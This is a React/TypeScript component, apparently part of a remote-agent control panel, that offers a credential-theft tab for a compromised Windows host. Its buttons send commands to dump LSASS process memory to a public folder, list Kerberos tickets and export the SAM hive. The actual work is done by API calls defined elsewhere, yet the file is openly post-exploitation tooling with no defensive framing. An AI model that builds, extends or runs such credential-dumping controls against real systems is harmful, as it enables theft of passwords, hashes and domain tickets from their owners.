'use client';

import { useState, type ReactNode } from 'react';
import { useTranslation } from 'react-i18next';
import { Button, Chip, Input, Label, Table, TextField } from '@heroui/react';
import { dumpLsass, klist, saveSam, type KlistTicket } from '../../api/othersoft';

function Action({ loading, onClick, children, variant = 'ghost' }: {
  loading: boolean;
  onClick: () => void;
  children: ReactNode;
  variant?: 'ghost' | 'primary';
}) {
  return (
    <Button size="sm" variant={variant} isDisabled={loading} onPress={onClick}>
      {loading ? '…' : children}
    </Button>
  );
}

export function CredsTab({ agentId }: { agentId: string }) {
  const { t } = useTranslation();
  const [dumpPath, setDumpPath] = useState('C:\\Users\\Public\\lsass.dmp');
  const [samDir, setSamDir] = useState('C:\\Users\\Public');
  const [tickets, setTickets] = useState<KlistTicket[]>([]);
  const [message, setMessage] = useState('');
  const [busy, setBusy] = useState<string | null>(null);

  const run = async (key: string, fn: () => Promise<unknown>) => {
    setBusy(key);
    setMessage('');
    try {
      const r = await fn() as { success?: boolean; error?: string; path?: string };
      setMessage(r?.error ?? (r?.success ? 'OK' : 'failed'));
      return r;
    } catch (e) {
      setMessage(String(e));
      return null;
    } finally {
      setBusy(null);
    }
  };

  const doLsass = () => run('lsass', async () => {
    const r = await dumpLsass(agentId, dumpPath);
    if (r?.success && r.path) setMessage(t('othersoft.dumpedTo', { path: r.path }));
    return r;
  });

  const doKlist = () => run('klist', async () => {
    const r = await klist(agentId);
    if (r?.success) setTickets(r.tickets ?? []);
    return r;
  });

  const doSam = () => run('sam', async () => {
    const r = await saveSam(agentId, samDir);
    if (r?.success) setMessage(t('othersoft.exportedTo', { path: samDir }));
    return r;
  });

  return (
    <div className="space-y-4">
      <div className="space-y-2">
        <div className="text-sm text-neutral-400">{t('othersoft.lsassDesc')}</div>
        <div className="flex flex-wrap items-center gap-2">
          <TextField variant="secondary" value={dumpPath} onChange={setDumpPath} className="w-72">
            <Label>{t('othersoft.dumpPath')}</Label>
            <Input />
          </TextField>
          <Action loading={busy === 'lsass'} onClick={doLsass} variant="primary">{t('othersoft.dumpLsass')}</Action>
        </div>
      </div>

      <div className="space-y-2">
        <div className="flex items-center gap-2">
          <div className="text-sm text-neutral-400">{t('othersoft.klistDesc')}</div>
          <Action loading={busy === 'klist'} onClick={doKlist}>{t('othersoft.queryTickets')}</Action>
        </div>
        <Table>
          <Table.ScrollContainer>
            <Table.Content aria-label={t('othersoft.klistDesc')} className="min-w-[640px]">
              <Table.Header>
                <Table.Column isRowHeader>SPN</Table.Column>
                <Table.Column>{t('othersoft.domain')}</Table.Column>
                <Table.Column>{t('othersoft.expires')}</Table.Column>
                <Table.Column>{t('othersoft.encryption')}</Table.Column>
              </Table.Header>
              <Table.Body renderEmptyState={() => (
                <div className="py-6 text-center text-neutral-500">{t('othersoft.noTickets')}</div>
              )}>
                {tickets.map((ticket, i) => (
                  <Table.Row key={i} id={i}>
                    <Table.Cell>{ticket.server || '-'}</Table.Cell>
                    <Table.Cell><Chip size="sm" variant="soft">{ticket.realm || '-'}</Chip></Table.Cell>
                    <Table.Cell>{ticket.end ? new Date(ticket.end / 10000 - 11644473600000).toLocaleString() : '-'}</Table.Cell>
                    <Table.Cell>{String(ticket.encryption)}</Table.Cell>
                  </Table.Row>
                ))}
              </Table.Body>
            </Table.Content>
          </Table.ScrollContainer>
        </Table>
      </div>

      <div className="space-y-2">
        <div className="text-sm text-neutral-400">{t('othersoft.samDesc')}</div>
        <div className="flex flex-wrap items-center gap-2">
          <TextField variant="secondary" value={samDir} onChange={setSamDir} className="w-64">
            <Label>{t('othersoft.exportDir')}</Label>
            <Input />
          </TextField>
          <Action loading={busy === 'sam'} onClick={doSam}>{t('othersoft.exportSam')}</Action>
        </div>
      </div>

      {message && <div className="text-sm text-neutral-500">{message}</div>}
    </div>
  );
}
